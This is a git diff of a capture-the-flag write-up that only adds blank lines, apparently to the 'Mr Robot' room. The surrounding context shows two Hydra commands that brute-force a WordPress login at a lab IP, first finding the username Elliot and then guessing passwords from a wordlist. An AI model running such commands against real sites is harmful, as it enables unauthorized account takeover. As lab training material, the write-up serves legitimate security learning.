@@ -88,6 +88,7 @@ In the previous /robots directory, I found a `fsocity.dic` dictionnary and I'll 
 I had a quick look at the login POST request to find the correct username and password parameters.
 
 **1st Step**:
+
 Hydra command: `hydra -L fsocity.dic -p testpass 10.10.48.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`
 
 Result: `[80][http-post-form] host: 10.10.48.69   login: Elliot   password: testpass`
@@ -95,6 +96,7 @@ Result: `[80][http-post-form] host: 10.10.48.69   login: Elliot   password: test
 The username is **Elliot**.
 
 **2nd Step**:
+
 I will try to use the fsocity.dic first (858160 words) before using a bigger wordlist.
 
 Hydra command: `hydra -l Elliot -P fsocity.dic 10.10.48.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"`
